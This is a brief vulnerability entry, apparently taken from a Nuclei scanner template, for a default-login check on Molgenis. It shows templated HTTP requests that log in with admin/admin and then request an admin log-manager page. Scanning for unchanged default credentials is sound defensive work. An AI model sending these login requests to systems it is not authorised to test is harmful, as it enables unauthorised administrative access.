# Vulnerability: Molgenis - Default Login
**Classification:** MOLGENIS
**Source:** Nuclei Template (`molgenis-default-login.yaml`)

## Description
Attempts to login to Molgenis using the default credentials (admin/admin). Successful login may indicate a security risk due to unchanged default credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}

GET /menu/admin/logmanager HTTP/1.1
Host: {{Hostname}}
```

